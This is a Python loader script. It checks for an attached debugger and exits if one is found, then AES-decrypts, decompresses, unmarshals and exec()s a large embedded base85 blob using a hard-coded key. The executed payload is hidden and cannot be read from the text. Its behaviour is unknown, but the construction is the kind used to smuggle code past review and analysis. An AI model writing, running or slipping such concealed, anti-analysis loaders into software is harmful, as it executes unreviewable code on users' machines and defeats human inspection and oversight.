import os
import base64
import hashlib
import marshal
import zlib
import traceback
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import sys

def _anti_debug():
    if sys.gettrace() or (os.name == 'nt' and __import__('ctypes').windll.kernel32.IsDebuggerPresent()):
        sys.exit(1)
_anti_debug()

_KEY = b'\x08\xb8h{\x94\x9f\xc1.\xbbw\xd8\x83\xa1\xa7\xa0\xcd'
_IV = b'U\x05U\xfe\xee\xd1\x99\x0b\xc4\xd2\x96\xa0I\xdc\xe9G'

def _decrypt_str(data):
    try:
        cipher = AES.new(_KEY, AES.MODE_CBC, _IV)
        return unpad(cipher.decrypt(data), 16).decode()
    except:
        return ""

def _main():
    try:
        _encrypted = 'A*8@Q2|z#nTEZcTV}J?)i;~#G!uEs996;C*1aqnK#6@JWZKX8C>TE#ZKjfAP!Bk$7d2qRL#KxjuM{3u2yf3p-i*3Li)<h>_<rRIbEv=6c$V$+-JqfB!$-?~-kxymHLfigZ<D{DO^=&zli;kQ0@l|*04{u&+H1FN#sl}4(6?64+WQUEIe&uEFn<_$?*my95cTM`B!qi_MO>u0RWYLa6;<RsW^gKETrX2V>Ycv0a(yP_Z(gr8!0Kr$egzvds3Kewy@{-M&Ov=4F)O&ZHoLnargi9{`&%+bu!~D@_7QL?pODKn$Qn6tJe9{zrjP3W;MV5Ero6{I>F5wlG^H*`t|0sh}cM*d@pQGV&vcWOvfql~wjMRH2cj1_8xWsHl_U1f&)V)aa;T37m(=#C$IYTA7h!sK{C{c?^EyuA`6ns=WOq|J{jV&5~@1C<_h#gWhZpMNq^%grK_RcdO)t$T*(!`casnllY@@Ej2=@c02639f?hEL@boqSPYA;vc-mGym{5tqtjW$V8(0%hKOL1M+%Ps$e+k1dsVuNZYW#Eh4s^LFyi_!sfEkt4`g3uaK|(Q}6{L872QLZ17(Q8<Fw1eL0D$uZA|)>GX*N5220Bj2~JH(Ian6@;h?NOmS)R7-5AHBz7x-SJk?w}e@HG5^pD`0IX|lg4@#at|>YtxE_nJrYaKJR9HJcYFod@BMP%SUNO1dUecX<Pe!V0EQbH?%17=TCw;jyqANuMM3xcZa>8?SyP}`nOKe)hT?dwg$&Xc$&bIGhzw}hGe@<L_}i+G#^ez`40&Bj4#P$fT&oD26M+|L$?a3v;dkrE4URxFt``L94~XqgGH9)7<J6v62tYI4)P-50Z#*FWQwqVPq6u~v1ZO+jX0dp4GD~&wn4!6$7;Q<MHw@^G6(Mwh_?8k;XVqMbNeHK*7*q?O^*Eo&)uEjH@AUL|RsFZlFyw`$RKu5_UF@XAckv~q1W1lrlx5|0&>9Ul&)%iZen1?4xFhQI-Ror2W#1f2q$j?WUIEEMf1poxU$iCEkMg1y0S*h~5i8T8y|mzaJew(Wa+b9jL;9YyRLg!Q;(o_2u2>$w7cM>J?k3U&Qf4Hbo<$bY5~(-cIgOsG2zq6='
        
        # Decryption steps
        cipher = AES.new(_KEY, AES.MODE_CBC, _IV)
        encrypted_data = base64.b85decode(_encrypted)
        decrypted_data = unpad(cipher.decrypt(encrypted_data), 16)
        decompressed_data = zlib.decompress(decrypted_data)
        
        exec(marshal.loads(decompressed_data), {
            **globals(),
            '__name__': '__main__',
            '__builtins__': __builtins__,
            '_decrypt_str': _decrypt_str
        })
    except Exception as e:
        print("Execution failed:")
        traceback.print_exc()
        sys.exit(1)

if __name__ == '__main__':
    _main()